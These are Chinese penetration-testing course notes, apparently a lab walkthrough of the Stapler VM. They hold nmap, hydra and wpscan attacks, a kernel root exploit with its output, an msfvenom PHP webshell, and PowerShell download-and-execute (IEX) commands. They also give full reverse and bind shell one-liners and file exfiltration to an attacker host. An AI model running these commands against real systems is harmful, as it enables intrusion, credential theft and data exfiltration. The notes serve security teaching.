bluez 提供了 sdptool工具，用于浏览设备上提供的服务。还需要注意的是，设备不必处于要扫描的发现模式。
sdptool browse 76:6E:46:63:72:66

62.4 l2ping 查看是否能达到远端蓝牙设备

62.5.

蓝牙攻击和渗透套件 bluediving
https://www.github.com/balle/bluediving.git


### 63 day 
网络漏洞利用-Stapler
63.1. 收集用户破解所需要的信息
（1）端口扫描
nmap -A  -T4 192.168.195.166

nmap -sT -T4 -sV  -p-   192.168.195.131
-sT  完全连接扫描 
-T4  扫描时序，极快的扫描
-sV 查看服务的版本
-p  扫描的端口，端口号的范围1-65535

nmap -A  -T4 -p- -oG stapler.txt  192.168.195.166

-oG   把扫描的结果分类保存

FTP、SSH 利用方式之一：进行用户的暴力破解
用户信息---收集
密码文件（字典文件）

		Kali自带的字典文件：/usr/share/wordlists/rockyou.txt.gz
		file rockyou.txt.gz 
		gunzip rockyou.txt.gz    
（2）连接扫描到的开放端口去收集有用的信息

1）21--FTP

支持匿名登录

匿名账号 ftp （或anonymous）
ftp>
	ls  查看
	get 下载
	put 上传
	cd  切换目录
	bye  离开
	lcd  更改本地的当前目录
	
2）22-SSH


3）HTTP-80

Zoe

Wappalyzer:网站技术分析插件

交换机每个端口都是一个冲突域
HUB所有端口在一个冲突域

### 64
64.1. CMS（内容管理系统）
内容管理系统（CMS），非常适合用来编辑Web应用的内容。
常用的CMS：
例如Drupal、WordPress、Magento和Joomla、帝国、织梦等

64.2 Wordpress介绍

（1）WordPress是一种开源的CMS，前端使用PHP，后端使用MySQL。它主要用于博客（blog)系统、建站
We recommend servers running version 7.4 or greater of PHP and MySQL version 5.6 OR MariaDB version 10.1 or greater.
We also recommend either Apache or Nginx as the most robust options for running WordPress, but neither is required. 

（2）WordPress于2003年5月27日由其创始人Matt Mullenweg和MikeLittle发布。

（3）它还包括一个插件（Plugin）架构和模板系统。WordPress插件架构允许用户扩展其网站或博客的特性和功能。截至2019年2月，WordPress.org共有54 402个免费插件和1500多个高级插件。

64.3. WordPress架构

WordPress架构可分为四个主要部分

·Display（显示）：包含用户可见的HTML、CSS和JavaScript文件。

·Theme/Template（主题/模板）：包括表单、主题文件、不同的WordPress页面，以及注释、页眉、页脚和错误页面等部分。

·WP-Engine：该引擎负责整个CMS的核心功能，例如RSS feeds、与数据库通信、设置、文件管理、媒体管理和缓存。

·WP Backend：包括数据库、PHPMailer定时任务和文件系统。

64.4. WordPress的目录结构

（1）配置文件：wp-config.php

（2）wp-includes文件夹包含前端使用的所有其他PHP文件和类，以及Wordpress Core所需的类。

（3）wp-admin

这个文件夹包含WordPress仪表板（Dashboard）的文件，这些文件用于执行所有管理任务

（4）wp-content 文件夹包含所有用户上传的数据


64.5. wpscan


wpscan --url https://192.168.195.166:12380/blogblog/ -e u  --disable-tls-checks
wpscan --update

64.6 使用Metasploit进行WordPress侦察

search wordpress_scanner type:auxiliary

	type:模块的类别
	auxiliary--辅助模块
	
auxiliary/scanner/http/wordpress_scanner---
检查wordpress的版本号、主题 、插件
Detects Wordpress Versions, Themes, and Plugins


1）search wordpress_scanner type:auxiliary
2）use auxiliary/scanner/http/wordpress_scanner
3）info
4）show options 
5）set RHOSTS 192.168.195.166
   set RPORT 12380
   set TARGETURI /blogblog
   set SSL true----https
6）run //运行


65
65.1. 使用Metasploit进行WordPress枚举

攻击面：用户、主题、插件

模块：auxiliary/scanner/http/wordpress_login_enum

WordPress Authentication Brute Force and User Enumeration Utility
use auxiliary/scanner/http/wordpress_login_enum
set BRUTEFORCE false
set THREADS    10  //设置线程数量，影响的速度
set RHOSTS 192.168.195.166
set RPORT 12380
set TARGETURI /blogblog
set SSL true
set USER_FILE     /root/work/exam/day64/staple_user.txt 
run

65.2. Information gathering via shares（共享）
利用Samba服务来收集用户信息

方法1：nmap的smb相关的脚本引擎

nmap  --script smb-os-discovery  192.168.195.166  
smb-os-discovery     枚举操作系统
smb-enum-shares.nse  枚举共享
smb-enum-users.nse   枚举用户

nmap  -p139 --script smb-enum-users  192.168.195.166  

方法2 enum4linux 


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))


 awk -F '\'  '{print $2}' xiao.txt | awk '{print $1}' >>staple_user.txt
 cat staple_user.txt
 wc -l staple_user.txt
 cat staple_user.txt| sort -u | wc -l
 cat staple_user.txt| sort -u  > staple_user2.txt
//sort -u 去重

smbclient //192.168.195.166/kathy
smbclient //192.168.195.166/tmp



Day66--暴力破解

工具：hydra

hydra是黑客组织thc的一款开源密码攻击工具

用户登录口令破解工具，支持多种登录协议如FTP、SSH、RDP（远程桌面协议）等

hydra -h 

Options:
  -R        restore a previous aborted/crashed session
  恢复之前中断的会话
  -I        ignore an existing restore file (don't wait 10 seconds)
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -y        disable use of symbols in bruteforce, see above
  -r             rainy mode for password generation (-x)
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
  -c TIME   wait time per login attempt over all threads (enforces -t 1)
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
  -O        use old SSL v2 and v3
  -K        do not redo failed attempts (good for -M mass scanning)
  -q        do not print messages about connection errors
  -U        service module usage details
  -m OPT    options specific for a module, see -U output for information
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)
Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh


用示:
hydra -e nsr -L staple_user2.txt 192.168.195.131 ftp
hydra -e nsr -L username ftp://192.168.195.131

-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE

-l  用户
-L  用户文件

-p PASS  or -P FILE  try password PASS, or load several passwords from FILE
-p  密码
-P  密码文件

 -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
 
  n 空密码
  s 用户名即密码
  r 密码和用户名相反

[21][ftp] host: 192.168.195.166   login: elly   password: ylle
[21][ftp] host: 192.168.195.166   login: SHayslett   password: SHayslett

SSH
cat passwd | grep 'sh$' | awk -F: '{print $1}'  >>staple_user2.txt

  -t TASKS  run TASKS number of connects in parallel per target (default: 16)

hydra -e nsr -L ssh_user.txt 192.168.195.166 ssh -t 4 

[22][ssh] host: 192.168.195.166   login: SHayslett   password: SHayslett

hydra  -L ssh_user.txt -P /usr/share/wordlists/rockyou.txt 192.168.195.166 ssh -t 20

Linux 提权 
利用Linux内核漏洞进行提权
利用内核是提升特权的一种极好的方式，但成功可能不仅取决于匹配目标的内核版本，还取决于操作系统发行版本
要收集的信息：
（1）内核版本   4.4.0-21-generic
（2）操作系统发行版本  Ubuntu 16.04
（3）架构 i686--32位

方法1 检测/etc/issue文件

/etc/issue文件，包含系统登录的提示信息，往往会有系统的版本信息

方法2：cat /etc/*-release
       lsb_release -a

Ubuntu 16.04 LTS


方法3： uname -r

方法4：  uname -m
		 arch
根据收集的信息查找漏洞

searchsploit linux kernel ubuntu 16.04

ubuntu 16.0.4 site:exploit-db.com

https://www.exploit-db.com/

https://www.seebug.org/

### *day67漏洞利用
step01
ssh SHayslett@192.168.195.166
密码：SHayslett
Step02: 在Kali中搭建一个简易的HTTP服务器（192.168.195.76）
python -m SimpleHTTPServer 8088
PS：当前目录就是网站的根目录

Step03 : 在靶机（Stapler）把代码下载到本地
cd /tmp
wget http://192.168.195.76:8088/39772.zip
unzip 39772.zip
cd 39772
tar xf exploit.tar
cd ebpf_mapfd_doubleput_exploit/
./compile.sh 
./doubleput 
id
cd /root
cat flag.txt
*****

总结：

Finding the OS and kernel version //查找OS和内核的版本
Searching the Internet for flaws, if any //通过Google查找该版本的系统是否有漏洞
Finding a few exploits
Cross-verifying with our available vectors //下载可利用的漏洞POC
All vectors compiled, so we downloaded and executed the Kernel exploit//对目标靶机进行漏洞利用

ubuntu 16.0.4 site:exploit-db.com
https://www.exploit-db.com/exploits/39772

searchsploit -m [EDB-ID] 
显示该编号对应的URL（网址）
searchsploit -m 39772  

wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip

  

An exploit that puts all this together is in exploit.tar. Usage:

user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)

This exploit was tested on a Ubuntu 16.04 Desktop system.

Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7

**Day68
 Cracking HTTP logins using custom wordlist
 68.1. 对HTTP的登录破解
 
wpscan --url https://192.168.195.166:12380/blogblog/ -P /usr/share/wordlists/rockyou.txt -t 50 --disable-tls-checks

-t  同时运行的线程

 | Username: john, Password: incorrect


68.2. 对Wordpress的利用（高权限的账号）
前提：高权限的账号（如安装新插件、修改模板等），类似于拿到了一个网站的管理后台
wordpress 基于PHP开发的

安装新插件功能中--上传文件（？一个PHP的木马）

如何制作一个PHP的木马呢？

msfvenom 专门制作木马的工具


msfvenom -p php/meterpreter_reverse_tcp  LHOST=192.168.195.9 LPORT=4444 -o shell.php
官方
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

step01: msfvenom -l payload
        msfvenom -l payload  | grep php

step02： msfvenom -p php/meterpreter/reverse_tcp --list-options 
查看指定payload（php/meterpreter/reverse_tcp）所支持的选项

msfvenom -p php/meterpreter/reverse_tcp --list-options                                                                                                              1 ⨯
Options for payload/php/meterpreter/reverse_tcp:
=========================


       Name: PHP Meterpreter, PHP Reverse TCP Stager
     Module: payload/php/meterpreter/reverse_tcp
   Platform: PHP
       Arch: php
Needs Admin: No
 Total size: 1101
       Rank: Normal

Provided by:
    egypt <egypt@metasploit.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Step03
msfvenom -p php/meterpreter/reverse_tcp  LHOST=192.168.195.76 LPORT=4444 -f raw -o webshell.php

LHOST  监听主机的地址--控制端（Kali的地址）
LPORT  监听端口--控制端监听的端口
-o 指定生成的文件
-f 生成的文件格式
	msfvenom  --list formats    //查看所支持的格式
	
	raw（随机的）根据payload类型自动选择相应的文件格式


官方
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe


### Da69
john/incorrect

1、制作木马
msfvenom -p php/meterpreter/reverse_tcp  LHOST=192.168.195.76 LPORT=4444 -f raw -o webshell.php

2、上传木马文件（安装新插件）

查看
https://192.168.195.166:12380/blogblog/wp-content/uploads/

3. 在攻击端（Kali）建立一个侦听器（Listener）
常用的一种方法：
（1）使用metasploit的exploit/multi/handler模块
 use exploit/multi/handler  //调用模块
 配置模块选项
 set payload php/meterpreter/reverse_tcp
 set lhost 192.168.195.76
 set lport 4444
 漏洞利用
 exploit

（2）拿到了Meterpreter会话
Meterpreter是一种使用内存技术的攻击载荷， 可以注入到进程之中。 它提供了各种可以在目标上执行的功能， 从而成为了最受欢迎的攻击载荷。
meterpreter > 中的命令
1）sysinfo 查看目标系统信息
2）shell 获取目标系统的shell

（3）获取交互式shell
python -c 'import pty;pty.spawn("/bin/bash")'

思考：利用Web程序的漏洞getshell，这个shell通常只能是普通（程序）用户的权限

4. 后渗透利用（ post-exploitation）是指攻击者在获得对目标的某种程度控制后所执行的操作。一些后利用行动包括提升特权，扩大控制到其他机器，安装后门，清理攻击证据（痕迹），上传文件和工具到目标机器，等等。

后渗透阶段--文件传输
如上传一个攻击工具、后门、POC等
方法1： 搭建一个简易的HTTP服务器
 python -m SimpleHTTPServer 8086
 目标：wget http://192.168.195.76:8086/39772.zip
方法2：利用nc传输文件

Kali  nc -nvlp 12306 < 39772.zip   
目标  nc -nv 192.168.195.76 12306 > 39772-2.zip

md5sum 39772-2.zip

### ### Day70
方法3： 使用FTP服务进行文件的上传



Step01 安装 配置Pure-FTPd

apt install pure-ftpd


配置脚本

#!/bin/bash
//创建组和系统用户
groupadd ftpgroup  
useradd -g ftpgroup -d /dev/null -s /bin/false ftpuser
-g 指定属组  -d  指定家目录  -s 指定登录shell
pure-pw useradd offsec -u ftpuser -d /ftphome
//创建虚拟用户offsec,映射到ftpuser这个系统用户 -d  指定用户的FTP主目录
pure-pw mkdb
//创建和更新虚拟账号数据库
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
//支持虚拟账号数据库对ftp用户做认证
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
//创建用户的FTP主目录并授权
systemctl restart pure-ftpd


ps:dos2unix 

把Windows下的文本格式转换成Linux格式的文本
查看换行符
cat -A
vi -b   

### ### Day71
使用FTP进行文件下载/上传

场景1：The Non-Interactive Shell（非交互式shell）

（1）非交互式的命令程序时如ls、ip a没有问题

（2）执行--交互式的命令程序 ftp、su、 sudo

解决方法：升级非交互式的shell---》交互式的shell

Python解释器通常安装在Linux系统上，它带有一个名为pty的标准模块，允许创建伪终端。
通过使用这个模块，我们可以从远程shell中生成一个独立的进程，并获得一个完全交互式的shell

命令：python -c 'import pty; pty.spawn("/bin/bash")'


场景2：Transferring Files with Windows Hosts
在Windows主机上进行文件传输

Linux提供了一些文件传输的客户端工具如nc 、curl 、wget等

（1）wget 
   -O,  --output-document=文件      将文档写入 FILE
（2）curl 
   -o, --output <file>  Write to file instead of stdout
   curl -o exe2bat.exe  http://192.168.195.76:8089/exe2bat.exe
（3）使用nc传输文件

76（whoami.exe）----》9

接收端（nc服务端）9
	nc  -lnvp 12306 >whoami.exe

发送端（nc客户端）76
   nc  -nv  192.168.195.9 12306 < whoami.exe -q 1

场景2.1.  Non-Interactive FTP Download---非交互式ftp下载
方法：ftp
 -s:filename     指定包含 FTP 命令的文本文件；
                 命令在 FTP 启动后自动运行。

### Day72
nmap -sS -Pn -n -A x.x.x.x
Windows主机如何实现ftp非交互式的下载

1、准备好ftp服务
systemctl start pure-ftpd
2、理解ftp客户端程序的操作

  -v              禁止显示远程服务器响应。
  -n              禁止在初始连接时自动登录。
  -i              关闭多文件传输过程中的
                  交互式提示。
  -d              启用调试。
  -g              禁用文件名通配(请参阅 GLOB 命令)。
  -s:filename     指定包含 FTP 命令的文本文件；命令
                  在 FTP 启动后自动运行。
  -a              在绑字数据连接时使用所有本地接口。
  -A              匿名登录。
  -x:send sockbuf 覆盖默认的 SO_SNDBUF 大小 8192。
  -r:recv sockbuf 覆盖默认的 SO_RCVBUF 大小 8192。
  -b:async count  覆盖默认的异步计数 3
  -w:windowsize   覆盖默认的传输缓冲区大小 65535。
  host            指定主机名称或要连接到的远程主机
                  的 IP 地址。


FTP*****资料补充
1971年，RFC114文档定义了FTP协议的最初版本。1985年，RFC959文档定义了FTP协议的新版本，它是目前FTP服务仍遵循的协议标准。

FTP命令由两部分组成：命令名与参数
FTP响应由两部分组成：响应码与描述信息
“2xx”表示命令已经完成，可以进行下一个命令；“3xx”表示命令已经接受，需要提供进一 步的信息；“4xx”表示命令无法完成，但是可以再次发送该命令；“5xx”表示命令无法完成，并且不要再次发送该命令

ftp> ?
命令：
open 主机  通过ftp协议连接到指定的主机
user 用户名  出具用户名
binary  把传输模式改为二进制模式，通常在传输程序文件时使用
ascii   默认的传输模式，适用于文本传输
get   下载
put    上传
bye  离开


echo open 192.168.195.76 21> ftp.txt
echo USER offsec>> ftp.txt
echo xiao>> ftp.txt
echo bin >> ftp.txt
echo GET whoami.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt

3、


Windows Downloads Using Scripting Languages

使用Windows脚本语言来实现非交互式下载

（1）VBScript 
   可以实现对Windows系统的管理和控制
   特别适用于早期的Windows 系统如（xp、2003）
VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. It allows Microsoft Windows system administrators to generate powerful tools for managing computers with error handling, subroutines, and other advanced programming constructs. It can give the user complete control over many aspects of their computing environment. 

（2）命令
C:\exam2>cscript /?   执行Windows的脚本如vb脚本
Microsoft (R) Windows Script Host Version 5.8
版权所有(C) Microsoft Corporation。保留所有权利。

用法：CScript scriptname.extension [option...] [arguments...]

选项：
 //B         批模式：不显示脚本错误及提示信息
 //D         启用 Active Debugging
 //E:engine  使用执行脚本的引擎
 //H:CScript 将默认的脚本宿主改为 CScript.exe
 //H:WScript 将默认的脚本宿主改为 WScript.exe （默认）
 //I         交互模式（默认，与 //B 相对)
 //Job:xxxx  执行一个 WSF 工作
 //Logo      显示徽标（默认）
 //Nologo    不显示徽标：执行时不显示标志
 //S         为该用户保存当前命令行选项
 //T:nn      超时设定秒：允许脚本运行的最长时间
 //X         在调试器中执行脚本
 //U         用 Unicode 表示来自控制台的重定向 I/O


（3）环境准备
cd /usr/share/windows-binaries
python3 -m http.server 8089


（4）

cscript wget.vbs http://192.168.195.76:8089/whoami.exe whoami.exe



### Day73
通过Powershell实现一个简易的Web客户端实现http下载

73.1. Powershell概述

PowerShell is a cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework. PowerShell runs on Windows, Linux, and macOS.

PowerShell is a powerful tool for penetration testing
PowerShell同时也是一个功能强大的渗透测试工具

Win+x

PowerShell包含一个内置的集成开发环境(IDE)，称为Windows PowerShell集成脚本环境(ISE) ISE是一个用于Windows PowerShell的主机应用程序，它使我们能够在一个基于Windows的图形用户界面中运行命令、编写、测试和调试脚本。该界面提供了多行编辑、制表符补全、语法着色、选择性执行、上下文敏感帮助、

73.2. Powershell执行策略

73.3. PowerShell File Transfers

环境准备
cd /usr/share/windows-binaries
python3 -m http.server 8089

 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.195.76:8089/wget.exe','C:\exam6\wget.exe')"

命令的分解：
powershell -c "命令"
-c 选项
这将执行所提供的命令(用双引号括起来)，就像在PowerShell提示符中输入一样。



相关网址
1. https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.2

2.

https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=netframework-4.7.2

3.
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=netframework-4.7.2

4.https://docs.microsoft.com/en-us/dotnet/api/system.net?view=netframework-4.7.2

5. https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2

6. https://github.com/rezaduty/cybersecurity-career-path

7.https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet

8. https://blog.csdn.net/qq_27446553/article/details/73635429







### Day74
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.195.76:8089/wget.exe','C:\exam6\wget.exe')"


Step01-Kali
cd /usr/share/windows-binaries
python3 -m http.server 8089
Step02 Windows （2012 或 10 ）
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.195.76:8089/whoami.exe" >>wget.ps1
echo $file = "whoami.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.195.76:8089/wget.exe','C:\exam6\wget.exe')"

Step03:
mkdir tools
cd tools
建议把Powershell的执行策略更改为默认的受限
get-ExecutionPolicy
Set-ExecutionPolicy restricted
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
-ExecutionPolicy Bypass  绕过默认的受限策略
-NoLogo 隐藏Powershell的banner信息
-NonInteractive 抑制powershell的交互式提示符
上述两个选项的目的就是使脚本在运行时更隐蔽
-NoProfile 不载入powershell的默认配置文件（非必需）
-File 指定你的脚本文件

74.2. Powershell脚本也可以远程执行
如果我们想下载并执PowerShell脚本而不将其保存到磁盘


powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')

Invoke-Expression 命令 简写为IEX，作用 运行行一个以字符串形式提供的 Windows PowerShell 表达式
DownloadString方法：把下载的文件解析为字符串



https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invokeexpression?view=powershell-6

案例演示
Step01:
echo 'Write-Output "Hello World" ' >helloworld.ps1

Step02:
python3 -m http.server 8089
Step03:

powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.195.76:8089/helloworld.ps1')



Step01: 使用8086模拟github等提供脚本的站点
先把wget.ps1脚本放在8086的站点服务器内
脚本内容
$webclient = New-Object System.Net.WebClient 
$url = "http://192.168.195.76:8089/whoami.exe" 
$file = "whoami.exe" 
$webclient.DownloadFile($url,$file) 

python3 -m http.server 8086


Step02 再开一个站点8089（模拟黑客提供的工具如whoami站点)

python3 -m http.server 8089
Step03 
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.195.76:8086/wget.ps1')
‘
'
### Day75
Powershell脚本的远程执行案例3

Invoke-ARPScan --ARP扫描

powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).Downloadstring('http://192.168.195.76:8086/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.195.0/24"


75.2. 迂回下载

从我们的Kali机器开始，我们将

1. 压缩我们想要传输的二进制文件
工具：upx
	  upx，一个可执行程序的包装器(也称为PE压缩工具)

2. 将其转换为十六进制字符串，并将其嵌入到一个Windows脚本中
exe2hex  把程序文件换为十六进制字符串
exe2hex -x nc.exe -p nc.cmd   

3. 文件检验工具（hash值计算工具）
certutil （Windows平台）
-hashfile         -- 通过文件生成并显示加密哈希
md5sum  （Linux平台）
sha*

[LAB]
FTP服务启动了
把通过upx处理的nc放在FTP的家目录
在Windows端
（1）使用ftp的ascii传输模式下载nc
     1）校验hash值-不一样
	 2）运行nc-不能运行
（2）使用ftp的binary传输模式下载nc
	1）校验hash值-一样
	2）运行nc-能运行
		说明binary传输模式--程序文件时
		    upx处理之后的程序变小了，但依然能正常运行


### Day76

Windows Uploads Using Windows Scripting Languages
Windows主机使用Windows脚本语言实现文件的上传，以导出客户端的数据

场景：幸运的是，通常HTTP通信（出站）都是被允许的
方法：使用System.Net.WebClient PowerShell类通过HTTP POST请求将数据上传到我们的Kali机器

Step01: 在Kali端架设一个Web服务器（LAMP）

systemctl start apache2

Step02 进入到/var/www/html 目录
写入一个上传页面如upload.php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

Step03 创建上传目录，并授权
ps -ef | grep apache2  
mkdir /var/www/uploads
chown www-data: /var/www/uploads

命令  选项   参数

Step04 使用Powershell脚本实现上传的目的了
 powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.195.76/upload.php', 'whoami.exe')

powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.195.76/upload.php', 'd:\startup.cfg')




http://192.168.195.76/upload.php'

### Day77
77.1 Uploading Files with TFTP
通过TFTP服务实现文件的上传
TFTP-简单文件传输协议，基于UDP传输的，端口是69
这是一个非常棒的非交互式文件传输工具

Step01 Kali中架设TFTP服务器
软件包：atftpd 服务端
		atftp  客户端
服务进程 atftpd
安装
 apt install atftp
 dpkg -l | grep atftp   //验证
 dpkg -l  
  -l|--list  [<表达式> ...]        简明地列出软件包的状态。
配置
   创建一个tftp根目录并授权
		mkdir /tftp
		chown nobody: /tftp
   启动
		atftpd --daemon --port 69 /tftp
		--daemon 以独立服务进程的方式启动
客户端
	tftp -i 192.168.195.76 put wget.exe
	
77.2 PowerShell Reverse Shells
 使用Powershell创建反向shell
 
 原因：由于PowerShell在大多数现代Windows机器上都是原生的
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.195.76',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 77.3. PowerShell Bind Shells
 使用Powershell创建正向shell
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes =0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

77.4. Powercat
Powercat本质上是netcat的Powershell版本

Netcat: The powershell version
功能：
1.文件传输
2.正向shell和反向shell
3.建立隧道
4.DNS隧道
5.以一个独立的Payload的方式运行，且支持对Payload编码
 
 
 Kali中安装Powercat
 apt install powercat
 脚本位置 
 /usr/share/windows-resources/powercat
 
 脚本的运行
 我们首先使用一个称为Dot-sourcing的PowerShell特性来加载powercat.ps1脚本,这将使所有的变量和函数声明在脚本中可用，在当前的PowerShell范围中
 
 Dot-sourcing的PowerShell特性
 （当您. .\脚本名称时，脚本(或脚本块)中定义的所有变量和函数将在脚本结束时保存在当前shell中。）
 通过这种方式，我们可以直接在PowerShell中直接使用Powercat而不是每次都执行脚本
 
 （1）反向shell
 Kali  （192.168.195.76）  
	nc -lnvp 443 
 Windows主机
 powercat -c  192.168.195.76 -p 443 -e cmd.exe 
  -c  客户端模式
 （2）正向shell
 -l   监听模式（服务端）
 powercat -l -p 12306 -e cmd.exe
 
 Kali 
	nc -nv 192.168.195.90 12306
信息安全1902/1903
作业1：
信息安全1901

 
 
 
 
 










### Day78
### *78天
Chapter15 管理LINUX内核和可加载内核模块

1. 什么是内核（kernel）？
操作系统的组成=内核空间+用户空间

2. 查看内核版本
uname -r
uname -a

cat /proc/version

3. 查看内核文件

ls /boot/vmlinuz-`uname -r`*
ls /boot/vmlinuz-$(uname -r)*

4. 系统的基本启动流程
BIOS（开机自检）-读取MBR内的操作系统引导程序（GRUB）-加载系统内核到内存---启动系统的第一个服务systemd（前身为init）---由systemd加载系统的其他服务

5. 内核模块
现在的Linux内核是基于模块化设计的，可以通过内核模块实现功能的扩展和识别一些新的硬件，而不需要重新编译内核。
我们把这种模块称为LKM（可加载内核模块）
Load Kernel Module

一种称为 rootkit 的特殊类型的恶意软件通常通过这些 LKM 嵌入到操作系统的内核中。如果恶意软件嵌入内核， 黑客就可以完全控制操作系统。

6. 内核优化*****
目的：
	提升性能
	扩展功能
	系统的加固、安全防范
工具：sysctl
配置文件：/etc/sysctl.conf 
查看帮助 man sysctl.conf

-p, --load[=<file>]  read values from file
读取文件中的参数值，使文件中的参数修改生效
-a 显示所有内核参数值（生效）

-w  临时更改内内核参数的值 
sysctl -w net.ipv4.ip_forward=1 

[案例1]禁止其他主机ping
忽略其他主机的echo请求
/proc/sys/net/ipv4/icmp_echo_ignore_all

net.ipv4.icmp_echo_ignore_all = 1

[案例2]打开IP转发功能（实施中间人攻击，劫持流量）

场景：实施中间人攻击，劫持流量（攻击现象如ARP欺骗）

内核的优化
net.ipv4.tcp_fin_timeout = 2
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_tw_recycle = 0
net.ipv4.tcp_syncookies = 1  //抵御SYN Flood能力
net.ipv4.tcp_keepalive_time =600
net.ipv4.ip_local_port_range = 32768   60999
net.ipv4.tcp_max_syn_backlog = 8182
net.core.somaxconn = 1024
net.ipv4.tcp_max_tw_buckets = 5000
net.ipv4.tcp_syn_retries = 1
net.ipv4.tcp_synack_retries = 1
net.ipv4.tcp_max_orphans = 2000




信息安全1902 王旭阳(2080057087)  11:43:41
内核的优化
net.ipv4.tcp_fin_timeout = 2 //修改系默认的 TIMEOUT 时间
net.ipv4.tcp_tw_reuse = 1	 //表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭；
net.ipv4.tcp_tw_recycle = 0  //表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭。
